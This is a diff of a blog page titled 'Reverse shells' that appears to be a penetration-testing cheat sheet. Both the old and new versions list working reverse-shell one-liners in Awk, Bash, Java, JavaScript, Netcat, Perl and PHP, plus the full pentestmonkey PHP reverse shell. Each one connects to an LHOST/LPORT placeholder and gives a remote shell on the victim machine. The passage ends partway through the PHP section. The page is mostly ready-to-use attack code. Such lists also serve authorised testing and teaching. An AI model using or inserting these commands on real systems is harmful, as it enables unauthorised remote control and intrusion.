@@ -2,7 +2,7 @@
 <html>
 <head>
 <meta charset="utf-8">
-<meta name="generator" content="Hugo 0.17-DEV" />
+<meta name="generator" content="Hugo 0.38.2" />
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
 <link rel="preload" href="https://alamot.github.io/css/noncrit.css" as="style" onload="this.rel='stylesheet'">
 <noscript><link rel="stylesheet" href="https://alamot.github.io/css/noncrit.css"></noscript>
@@ -134,12 +134,14 @@ div.centered, p.centered, figcaption.centered, nav.centered, table.centered, h1.
 </style>
 <link rel="alternate" type="application/rss+xml" title="RSS" href="https://alamot.github.io/index.xml">
 
+  <link href="https://alamot.github.io/index.xml" rel="alternate" type="application/rss+xml" title="The Portal of Knowledge" />
+
 
   <title>Reverse shells - The Portal of Knowledge</title>
   <meta property='og:title' content="Reverse shells - The Portal of Knowledge">
   <meta property="og:type" content="article">
-  <meta name="description" content="One-liner reverse shells. Ανάποδα κέλυφη μίας γραμμής.">
-  <meta property="og:description" content="One-liner reverse shells. Ανάποδα κέλυφη μίας γραμμής.">
+  <meta name="description" content="One-liner commands to get reverse shell. Εντολές μονής γραμμής για την απόκτηση αντιστρόφου κελύφους.">
+  <meta property="og:description" content="One-liner commands to get reverse shell. Εντολές μονής γραμμής για την απόκτηση αντιστρόφου κελύφους.">
   <meta property="og:image" content="https://alamot.github.io/images/shell.jpg">
   <meta property="og:image:width" content="768" />
   <meta property="og:image:height" content="384" />
@@ -153,7 +155,7 @@ div.centered, p.centered, figcaption.centered, nav.centered, table.centered, h1.
     "@type": "BlogPosting",
     "mainEntityOfPage":{
       "@type":"WebPage",
-      "@id":"https:\/\/alamot.github.io\/"
+      "@id":"https://alamot.github.io/"
     },
     "headline": "Reverse shells |  ",
     "image": {
@@ -166,15 +168,15 @@ div.centered, p.centered, figcaption.centered, nav.centered, table.centered, h1.
     "dateModified": "2018-04-12T00:00:00JST",
     "author": {
       "@type": "Person",
-      "name": "",
-      "image": "https:\/\/alamot.github.io\/images/logo.png"
+      "name": "Antonios Tsolis",
+      "image": "https://alamot.github.io/images/logo.png"
     },
     "publisher": {
       "@type": "Organization",
       "name": "",
       "logo": {
         "@type": "ImageObject",
-        "url": "https:\/\/alamot.github.io\/images/logo.png",
+        "url": "https://alamot.github.io/images/logo.png",
         "height": 60,
         "width": 60
       }
@@ -255,7 +257,7 @@ if (language) {
         <div class="image" style="background-image: url(https://alamot.github.io/images/shell.jpg);"></div>
         <div class="body">
             <header lang="en"><h1 id="title" class="title">Reverse shells</h1></header>
-            <header lang="el"><h1 class="title">Ανάποδα κελύφη (reverse shells)</h1></header>
+            <header lang="el"><h1 class="title">Αντίστροφα κελύφη (reverse shells)</h1></header>
             <i class="fa fa-calendar topmargin7"  aria-hidden="true"></i>  
             <time lang="en" class="topmargin7">12 Apr 2018</time>
             <time lang="el" class="topmargin7">12 Απρ 2018</time>
@@ -309,158 +311,94 @@ if (language) {
 
 <h1 id="awk">Awk</h1>
 
-<div class="highlight"><pre><code class="language-awk" data-lang="awk"><span></span><span class="nx">awk</span> <span class="s1">&#39;BEGIN {s = &quot;/inet/tcp/0/LHOST/LPORT&quot;; while(42) { do{ printf &quot;shell&gt;&quot; |&amp; s; s |&amp; getline c; if(c){ while ((c |&amp; getline) &gt; 0) print $0 |&amp; s; close(c); } } while(c != &quot;exit&quot;) close(s); }}&#39;</span> <span class="o">/</span><span class="nx">dev</span><span class="o">/</span><span class="nx">null</span>
-</code></pre></div>
-
+<div class="highlight"><pre class="chroma"><code class="language-awk" data-lang="awk"><span class="nx">awk</span> <span class="s1">&#39;BEGIN {s = &#34;/inet/tcp/0/LHOST/LPORT&#34;; while(42) { do{ printf &#34;shell&gt;&#34; |&amp; s; s |&amp; getline c; if(c){ while ((c |&amp; getline) &gt; 0) print $0 |&amp; s; close(c); } } while(c != &#34;exit&#34;) close(s); }}&#39;</span> <span class="err">/dev/null</span></code></pre></div>
 
 <h1 id="bash">Bash</h1>
 
-<p><div class="highlight"><pre><code class="language-bash" data-lang="bash"><span></span>bash -i &gt;<span class="p">&amp;</span> /dev/tcp/LHOST/LPORT <span class="m">0</span>&gt;<span class="p">&amp;</span><span class="m">1</span>
-</code></pre></div>
-
-<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span></span><span class="m">0</span>&lt;<span class="p">&amp;</span><span class="m">196</span><span class="p">;</span><span class="nb">exec</span> <span class="m">196</span>&lt;&gt;/dev/tcp/LHOST/LPORT<span class="p">;</span> sh &lt;<span class="p">&amp;</span><span class="m">196</span> &gt;<span class="p">&amp;</span><span class="m">196</span> <span class="m">2</span>&gt;<span class="p">&amp;</span><span class="m">196</span>
-</code></pre></div>
-
-<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span></span><span class="nb">exec</span> <span class="m">5</span>&lt;&gt;/dev/tcp/LHOST/LPORT <span class="o">&amp;&amp;</span> <span class="k">while</span> <span class="nb">read</span> line <span class="m">0</span>&lt;<span class="p">&amp;</span><span class="m">5</span><span class="p">;</span> <span class="k">do</span> <span class="nv">$line</span> <span class="m">2</span>&gt;<span class="p">&amp;</span><span class="m">5</span> &gt;<span class="p">&amp;</span><span class="m">5</span><span class="p">;</span> <span class="k">done</span>
-</code></pre></div>
-</p>
+<p><div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">bash -i &gt;<span class="p">&amp;</span> /dev/tcp/LHOST/LPORT <span class="m">0</span>&gt;<span class="p">&amp;</span><span class="m">1</span></code></pre></div>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash"><span class="m">0</span>&lt;<span class="p">&amp;</span><span class="m">196</span><span class="p">;</span><span class="nb">exec</span> <span class="m">196</span>&lt;&gt;/dev/tcp/LHOST/LPORT<span class="p">;</span> sh &lt;<span class="p">&amp;</span><span class="m">196</span> &gt;<span class="p">&amp;</span><span class="m">196</span> <span class="m">2</span>&gt;<span class="p">&amp;</span><span class="m">196</span></code></pre></div>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash"><span class="nb">exec</span> <span class="m">5</span>&lt;&gt;/dev/tcp/LHOST/LPORT <span class="o">&amp;&amp;</span> <span class="k">while</span> <span class="nb">read</span> line <span class="m">0</span>&lt;<span class="p">&amp;</span><span class="m">5</span><span class="p">;</span> <span class="k">do</span> <span class="nv">$line</span> <span class="m">2</span>&gt;<span class="p">&amp;</span><span class="m">5</span> &gt;<span class="p">&amp;</span><span class="m">5</span><span class="p">;</span> <span class="k">done</span></code></pre></div></p>
 
 <h1 id="java">Java</h1>
 
-<div class="highlight"><pre><code class="language-java" data-lang="java"><span></span><span class="n">r</span> <span class="o">=</span> <span class="n">Runtime</span><span class="o">.</span><span class="na">getRuntime</span><span class="o">();</span> <span class="n">p</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="na">exec</span><span class="o">([</span><span class="s">&quot;/bin/bash&quot;</span><span class="o">,</span><span class="s">&quot;-c&quot;</span><span class="o">,</span><span class="s">&quot;exec 5&lt;&gt;/dev/tcp/LHOST/LPORT;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done&quot;</span><span class="o">]</span> <span class="n">as</span> <span class="n">String</span><span class="o">[]);</span> <span class="n">p</span><span class="o">.</span><span class="na">waitFor</span><span class="o">()</span>
-</code></pre></div>
-
+<div class="highlight"><pre class="chroma"><code class="language-java" data-lang="java"><span class="n">r</span> <span class="o">=</span> <span class="n">Runtime</span><span class="o">.</span><span class="na">getRuntime</span><span class="o">();</span> <span class="n">p</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="na">exec</span><span class="o">([</span><span class="s">&#34;/bin/bash&#34;</span><span class="o">,</span><span class="s">&#34;-c&#34;</span><span class="o">,</span><span class="s">&#34;exec 5&lt;&gt;/dev/tcp/LHOST/LPORT;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done&#34;</span><span class="o">]</span> <span class="n">as</span> <span class="n">String</span><span class="o">[]);</span> <span class="n">p</span><span class="o">.</span><span class="na">waitFor</span><span class="o">()</span></code></pre></div>
 
 <h1 id="javascript">Javascript</h1>
 
-<div class="highlight"><pre><code class="language-js" data-lang="js"><span></span><span class="p">(</span><span class="kd">function</span><span class="p">(){</span> <span class="kd">var</span> <span class="nx">net</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s2">&quot;net&quot;</span><span class="p">),</span> <span class="nx">cp</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s2">&quot;child_process&quot;</span><span class="p">),</span> <span class="nx">sh</span> <span class="o">=</span> <span class="nx">cp</span><span class="p">.</span><span class="nx">spawn</span><span class="p">(</span><span class="s2">&quot;/bin/sh&quot;</span><span class="p">,</span> <span class="p">[]);</span> <span class="kd">var</span> <span class="nx">client</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">net</span><span class="p">.</span><span class="nx">Socket</span><span class="p">();</span> <span class="nx">client</span><span class="p">.</span><span class="nx">connect</span><span class="p">(</span><span class="nx">LPORT</span><span class="p">,</span> <span class="s2">&quot;LHOST&quot;</span><span class="p">,</span> <span class="kd">function</span><span class="p">(){</span> <span class="nx">client</span><span class="p">.</span><span class="nx">pipe</span><span class="p">(</span><span class="nx">sh</span><span class="p">.</span><span class="nx">stdin</span><span class="p">);</span> <span class="nx">sh</span><span class="p">.</span><span class="nx">stdout</span><span class="p">.</span><span class="nx">pipe</span><span class="p">(</span><span class="nx">client</span><span class="p">);</span> <span class="nx">sh</span><span class="p">.</span><span class="nx">stderr</span><span class="p">.</span><span class="nx">pipe</span><span class="p">(</span><span class="nx">client</span><span class="p">);</span> <span class="p">});</span> <span class="k">return</span> <span class="sr">/a/</span><span class="p">;</span> <span class="p">})();</span>
+<div class="highlight"><pre class="chroma"><code class="language-js" data-lang="js"><span class="p">(</span><span class="kd">function</span><span class="p">(){</span> <span class="kd">var</span> <span class="nx">net</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s2">&#34;net&#34;</span><span class="p">),</span> <span class="nx">cp</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s2">&#34;child_process&#34;</span><span class="p">),</span> <span class="nx">sh</span> <span class="o">=</span> <span class="nx">cp</span><span class="p">.</span><span class="nx">spawn</span><span class="p">(</span><span class="s2">&#34;/bin/sh&#34;</span><span class="p">,</span> <span class="p">[]);</span> <span class="kd">var</span> <span class="nx">client</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">net</span><span class="p">.</span><span class="nx">Socket</span><span class="p">();</span> <span class="nx">client</span><span class="p">.</span><span class="nx">connect</span><span class="p">(</span><span class="nx">LPORT</span><span class="p">,</span> <span class="s2">&#34;LHOST&#34;</span><span class="p">,</span> <span class="kd">function</span><span class="p">(){</span> <span class="nx">client</span><span class="p">.</span><span class="nx">pipe</span><span class="p">(</span><span class="nx">sh</span><span class="p">.</span><span class="nx">stdin</span><span class="p">);</span> <span class="nx">sh</span><span class="p">.</span><span class="nx">stdout</span><span class="p">.</span><span class="nx">pipe</span><span class="p">(</span><span class="nx">client</span><span class="p">);</span> <span class="nx">sh</span><span class="p">.</span><span class="nx">stderr</span><span class="p">.</span><span class="nx">pipe</span><span class="p">(</span><span class="nx">client</span><span class="p">);</span> <span class="p">});</span> <span class="k">return</span> <span class="sr">/a/</span><span class="p">;</span> <span class="p">})();</span>
 </code></pre></div>
-
 
 <h1 id="netcat">Netcat</h1>
 
-<p><div class="highlight"><pre><code class="language-bash" data-lang="bash"><span></span>nc -e /bin/sh LHOST LPORT
-</code></pre></div>
-
-<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span></span>/bin/sh <span class="p">|</span> nc LHOST LPORT
-</code></pre></div>
-
-<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span></span>rm -f /tmp/f<span class="p">;</span>mkfifo /tmp/f<span class="p">;</span>cat /tmp/f<span class="p">|</span>/bin/sh -i <span class="m">2</span>&gt;<span class="p">&amp;</span><span class="m">1</span><span class="p">|</span>nc LHOST LPORT &gt;/tmp/f
-</code></pre></div>
-
-<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span></span>rm -f backpipe<span class="p">;</span> mknod /tmp/backpipe p <span class="o">&amp;&amp;</span> /bin/sh <span class="m">0</span>&lt;/tmp/backpipe <span class="p">|</span> nc LHOST LPORT <span class="m">1</span>&gt;/tmp/backpipe
-</code></pre></div>
-
-<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span></span>rm -f backpipe<span class="p">;</span> mknod /tmp/backpipe p <span class="o">&amp;&amp;</span> nc LHOST LPORT <span class="m">0</span>&lt;backpipe <span class="p">|</span> /bin/bash <span class="m">1</span>&gt;backpipe
-</code></pre></div>
-</p>
+<p><div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">nc -e /bin/sh LHOST LPORT</code></pre></div>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">/bin/sh <span class="p">|</span> nc LHOST LPORT</code></pre></div>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">rm -f /tmp/f<span class="p">;</span>mkfifo /tmp/f<span class="p">;</span>cat /tmp/f<span class="p">|</span>/bin/sh -i <span class="m">2</span>&gt;<span class="p">&amp;</span><span class="m">1</span><span class="p">|</span>nc LHOST LPORT &gt;/tmp/f</code></pre></div>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">rm -f backpipe<span class="p">;</span> mknod /tmp/backpipe p <span class="o">&amp;&amp;</span> /bin/sh <span class="m">0</span>&lt;/tmp/backpipe <span class="p">|</span> nc LHOST LPORT <span class="m">1</span>&gt;/tmp/backpipe</code></pre></div>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">rm -f backpipe<span class="p">;</span> mknod /tmp/backpipe p <span class="o">&amp;&amp;</span> nc LHOST LPORT <span class="m">0</span>&lt;backpipe <span class="p">|</span> /bin/bash <span class="m">1</span>&gt;backpipe</code></pre></div></p>
 
 <h1 id="perl">Perl</h1>
 
-<p><div class="highlight"><pre><code class="language-perl" data-lang="perl"><span></span><span class="n">perl</span> <span class="o">-</span><span class="n">e</span> <span class="s">&#39;use Socket;$i=&quot;LHOST&quot;;$p=LPORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);};&#39;</span>
-</code></pre></div>
-
-<div class="highlight"><pre><code class="language-perl" data-lang="perl"><span></span><span class="n">perl</span> <span class="o">-</span><span class="n">MIO</span> <span class="o">-</span><span class="n">e</span> <span class="s">&#39;$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,&quot;LPORT:LHOST&quot;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;&#39;</span>
-</code></pre></div>
-
-<div class="highlight"><pre><code class="language-perl" data-lang="perl"><span></span><span class="c1"># Windows</span>
-<span class="n">perl</span> <span class="o">-</span><span class="n">MIO</span> <span class="o">-</span><span class="n">e</span> <span class="s">&#39;$c=new IO::Socket::INET(PeerAddr,&quot;LPORT:LHOST&quot;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;&#39;</span>
-</code></pre></div>
-</p>
+<p><div class="highlight"><pre class="chroma"><code class="language-perl" data-lang="perl"><span class="n">perl</span> <span class="o">-</span><span class="n">e</span> <span class="s">&#39;use Socket;$i=&#34;LHOST&#34;;$p=LPORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&#34;tcp&#34;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&#34;&gt;&amp;S&#34;);open(STDOUT,&#34;&gt;&amp;S&#34;);open(STDERR,&#34;&gt;&amp;S&#34;);exec(&#34;/bin/sh -i&#34;);};&#39;</span></code></pre></div>
+<div class="highlight"><pre class="chroma"><code class="language-perl" data-lang="perl"><span class="n">perl</span> <span class="o">-</span><span class="n">MIO</span> <span class="o">-</span><span class="n">e</span> <span class="s">&#39;$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,&#34;LPORT:LHOST&#34;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;&#39;</span></code></pre></div>
+<div class="highlight"><pre class="chroma"><code class="language-perl" data-lang="perl"><span class="c1"># Windows</span>
+<span class="n">perl</span> <span class="o">-</span><span class="n">MIO</span> <span class="o">-</span><span class="n">e</span> <span class="s">&#39;$c=new IO::Socket::INET(PeerAddr,&#34;LPORT:LHOST&#34;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;&#39;</span></code></pre></div></p>
 
 <h1 id="php">PHP</h1>
 
-<p><div class="highlight"><pre><code class="language-php" data-lang="php"><span></span><span class="x">php -r &#39;$sock=fsockopen(&quot;LHOST&quot;,LPORT);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;</span>
-</code></pre></div>
-
-<div class="highlight"><pre><code class="language-php" data-lang="php"><span></span><span class="x">php -r &#39;$sock=fsockopen(&quot;LHOST&quot;,LPORT);shell_exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;</span>
-</code></pre></div>
-
-<div class="highlight"><pre><code class="language-php" data-lang="php"><span></span><span class="x">php -r &#39;$sock=fsockopen(&quot;LHOST&quot;,LPORT);`/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3`;&#39;</span>
-</code></pre></div>
-
-<div class="highlight"><pre><code class="language-php" data-lang="php"><span></span><span class="x">php -r &#39;$sock=fsockopen(&quot;LHOST&quot;,LPORT);system(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;</span>
-</code></pre></div>
-
-<div class="highlight"><pre><code class="language-php" data-lang="php"><span></span><span class="x">php -r &#39;$sock=fsockopen(&quot;LHOST&quot;,LPORT);popen(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;, &quot;r&quot;);&#39;</span>
-</code></pre></div>
-
-<div class="highlight"><pre><code class="language-php" data-lang="php"><span></span><span class="x">// pentestmonkey one-liner ^_^</span>
-<span class="cp">&lt;?php</span> <span class="nb">set_time_limit</span> <span class="p">(</span><span class="mi">0</span><span class="p">);</span> <span class="nv">$VERSION</span> <span class="o">=</span> <span class="s2">&quot;1.0&quot;</span><span class="p">;</span> <span class="nv">$ip</span> <span class="o">=</span> <span class="s2">&quot;LHOST&quot;</span><span class="p">;</span> <span class="nv">$port</span> <span class="o">=</span> <span class="nx">LPORT</span><span class="p">;</span> <span class="nv">$chunk_size</span> <span class="o">=</span> <span class="mi">1400</span><span class="p">;</span> <span class="nv">$write_a</span> <span class="o">=</span> <span class="k">null</span><span class="p">;</span> <span class="nv">$error_a</span> <span class="o">=</span> <span class="k">null</span><span class="p">;</span> <span class="nv">$shell</span> <span class="o">=</span> <span class="s2">&quot;uname -a; w; id; /bin/bash -i&quot;</span><span class="p">;</span> <span class="nv">$daemon</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$debug</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="k">if</span> <span class="p">(</span><span class="nb">function_exists</span><span class="p">(</span><span class="s2">&quot;pcntl_fork&quot;</span><span class="p">))</span> <span class="p">{</span> <span class="nv">$pid</span> <span class="o">=</span> <span class="nb">pcntl_fork</span><span class="p">();</span> <span class="k">if</span> <span class="p">(</span><span class="nv">$pid</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span> <span class="nx">printit</span><span class="p">(</span><span class="s2">&quot;ERROR: Cannot fork&quot;</span><span class="p">);</span> <span class="k">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span> <span class="p">}</span> <span class="k">if</span> <span class="p">(</span><span class="nv">$pid</span><span class="p">)</span> <span class="p">{</span> <span class="k">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span> <span class="p">}</span> <span class="k">if</span> <span class="p">(</span><span class="nb">posix_setsid</span><span class="p">()</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span> <span class="nx">printit</span><span class="p">(</span><span class="s2">&quot;Error: Cannot setsid()&quot;</span><span class="p">);</span> <span class="k">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span> <span class="p">}</span> <span class="nv">$daemon</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span> <span class="p">}</span> <span class="k">else</span> <span class="p">{</span> <span class="nx">printit</span><span class="p">(</span><span class="s2">&quot;WARNING: Failed to daemonise.  This is quite common and not fatal.&quot;</span><span class="p">);</span> <span class="p">}</span> <span class="nb">chdir</span><span class="p">(</span><span class="s2">&quot;/&quot;</span><span class="p">);</span> <span class="nb">umask</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span> <span class="nv">$sock</span> <span class="o">=</span> <span class="nb">fsockopen</span><span class="p">(</span><span class="nv">$ip</span><span class="p">,</span> <span class="nv">$port</span><span class="p">,</span> <span class="nv">$errno</span><span class="p">,</span> <span class="nv">$errstr</span><span class="p">,</span> <span class="mi">30</span><span class="p">);</span> <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$sock</span><span class="p">)</span> <span class="p">{</span> <span class="nx">printit</span><span class="p">(</span><span class="s2">&quot;</span><span class="si">$errstr</span><span class="s2"> (</span><span class="si">$errno</span><span class="s2">)&quot;</span><span class="p">);</span> <span class="k">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span> <span class="p">}</span> <span class="nv">$descriptorspec</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="mi">0</span> <span class="o">=&gt;</span> <span class="k">array</span><span class="p">(</span><span class="s2">&quot;pipe&quot;</span><span class="p">,</span> <span class="s2">&quot;r&quot;</span><span class="p">),</span> <span class="mi">1</span> <span class="o">=&gt;</span> <span class="k">array</span><span class="p">(</span><span class="s2">&quot;pipe&quot;</span><span class="p">,</span> <span class="s2">&quot;w&quot;</span><span class="p">),</span> <span class="mi">2</span> <span class="o">=&gt;</span> <span class="k">array</span><span class="p">(</span><span class="s2">&quot;pipe&quot;</span><span class="p">,</span> <span class="s2">&quot;w&quot;</span><span class="p">));</span> <span class="nv">$process</span> <span class="o">=</span> <span class="nb">proc_open</span><span class="p">(</span><span class="nv">$shell</span><span class="p">,</span> <span class="nv">$descriptorspec</span><span class="p">,</span> <span class="nv">$pipes</span><span class="p">);</span> <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">is_resource</span><span class="p">(</span><span class="nv">$process</span><span class="p">))</span> <span class="p">{</span> <span class="nx">printit</span><span class="p">(</span><span class="s2">&quot;ERROR: Cannot spawn shell&quot;</span><span class="p">);</span> <span class="k">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span> <span class="p">}</span> <span class="nb">stream_set_blocking</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="mi">0</span><span class="p">);</span> <span class="nb">stream_set_blocking</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="mi">0</span><span class="p">);</span> <span class="nb">stream_set_blocking</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span> <span class="mi">0</span><span class="p">);</span> <span class="nb">stream_set_blocking</span><span class="p">(</span><span class="nv">$sock</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span> <span class="nx">printit</span><span class="p">(</span><span class="s2">&quot;Successfully opened reverse shell to </span><span class="si">$ip</span><span class="s2">:</span><span class="si">$port</span><span class="s2">&quot;</span><span class="p">);</span> <span class="k">while</span> <span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span> <span class="k">if</span> <span class="p">(</span><span class="nb">feof</span><span class="p">(</span><span class="nv">$sock</span><span class="p">))</span> <span class="p">{</span> <span class="nx">printit</span><span class="p">(</span><span class="s2">&quot;ERROR: Shell connection terminated&quot;</span><span class="p">);</span> <span class="k">break</span><span class="p">;</span> <span class="p">}</span> <span class="k">if</span> <span class="p">(</span><span class="nb">feof</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">1</span><span class="p">]))</span> <span class="p">{</span> <span class="nx">printit</span><span class="p">(</span><span class="s2">&quot;ERROR: Shell process terminated&quot;</span><span class="p">);</span> <span class="k">break</span><span class="p">;</span> <span class="p">}</span> <span class="nv">$read_a</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="nv">$sock</span><span class="p">,</span> <span class="nv">$pipes</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="nv">$pipes</span><span class="p">[</span><span class="mi">2</span><span class="p">]);</span> <span class="nv">$num_changed_sockets</span> <span class="o">=</span> <span class="nb">stream_select</span><span class="p">(</span><span class="nv">$read_a</span><span class="p">,</span> <span class="nv">$write_a</span><span class="p">,</span> <span class="nv">$error_a</span><span class="p">,</span> <span class="k">null</span><span class="p">);</span> <span class="k">if</span> <span class="p">(</span><span class="nb">in_array</span><span class="p">(</span><span class="nv">$sock</span><span class="p">,</span> <span class="nv">$read_a</span><span class="p">))</span> <span class="p">{</span> <span class="k">if</span> <span class="p">(</span><span class="nv">$debug</span><span class="p">)</span> <span class="nx">printit</span><span class="p">(</span><span class="s2">&quot;SOCK READ&quot;</span><span class="p">);</span> <span class="nv">$input</span> <span class="o">=</span> <span class="nb">fread</span><span class="p">(</span><span class="nv">$sock</span><span class="p">,</span> <span class="nv">$chunk_size</span><span class="p">);</span> <span class="k">if</span> <span class="p">(</span><span class="nv">$debug</span><span class="p">)</span> <span class="nx">printit</span><span class="p">(</span><span class="s2">&quot;SOCK: </span><span class="si">$input</span><span class="s2">&quot;</span><span class="p">);</span> <span class="nb">fwrite</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="nv">$input</span><span class="p">);</span> <span class="p">}</span> <span class="k">if</span> <span class="p">(</span><span class="nb">in_array</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="nv">$read_a</span><span class="p">))</span> <span class="p">{</span> <span class="k">if</span> <span class="p">(</span><span class="nv">$debug</span><span class="p">)</span> <span class="nx">printit</span><span class="p">(</span><span class="s2">&quot;STDOUT READ&quot;</span><span class="p">);</span> <span class="nv">$input</span> <span class="o">=</span> <span class="nb">fread</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="nv">$chunk_size</span><span class="p">);</span> <span class="k">if</span> <span class="p">(</span><span class="nv">$debug</span><span class="p">)</span> <span class="nx">printit</span><span class="p">(</span><span class="s2">&quot;STDOUT: </span><span class="si">$input</span><span class="s2">&quot;</span><span class="p">);</span> <span class="nb">fwrite</span><span class="p">(</span><span class="nv">$sock</span><span class="p">,</span> <span class="nv">$input</span><span class="p">);</span> <span class="p">}</span> <span class="k">if</span> <span class="p">(</span><span class="nb">in_array</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span> <span class="nv">$read_a</span><span class="p">))</span> <span class="p">{</span> <span class="k">if</span> <span class="p">(</span><span class="nv">$debug</span><span class="p">)</span> <span class="nx">printit</span><span class="p">(</span><span class="s2">&quot;STDERR READ&quot;</span><span class="p">);</span> <span class="nv">$input</span> <span class="o">=</span> <span class="nb">fread</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span> <span class="nv">$chunk_size</span><span class="p">);</span> <span class="k">if</span> <span class="p">(</span><span class="nv">$debug</span><span class="p">)</span> <span class="nx">printit</span><span class="p">(</span><span class="s2">&quot;STDERR: </span><span class="si">$input</span><span class="s2">&quot;</span><span class="p">);</span> <span class="nb">fwrite</span><span class="p">(</span><span class="nv">$sock</span><span class="p">,</span> <span class="nv">$input</span><span class="p">);</span> <span class="p">}</span> <span class="p">}</span> <span class="nb">fclose</span><span class="p">(</span><span class="nv">$sock</span><span class="p">);</span> <span class="nb">fclose</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span> <span class="nb">fclose</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span> <span class="nb">fclose</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">2</span><span class="p">]);</span> <span class="nb">proc_close</span><span class="p">(</span><span class="nv">$process</span><span class="p">);</span> <span class="k">function</span> <span class="nf">printit</span> <span class="p">(</span><span class="nv">$string</span><span class="p">)</span> <span class="p">{</span>  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$daemon</span><span class="p">)</span> <span class="p">{</span> <span class="k">print</span> <span class="s2">&quot;</span><span class="si">$string\\n</span><span class="s2">&quot;</span><span class="p">;</span> <span class="p">}</span> <span class="p">}</span> <span class="cp">?&gt;</span><span class="x"></span>
-</code></pre></div>
-</p>
+<p><div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php">php -r &#39;$sock=fsockopen(&#34;LHOST&#34;,LPORT);exec(&#34;/bin/sh -i <span class="err">&lt;&amp;</span>3 &gt;<span class="err">&amp;</span>3 2&gt;<span class="ni">&amp;3&#34;);</span>&#39;</code></pre></div>
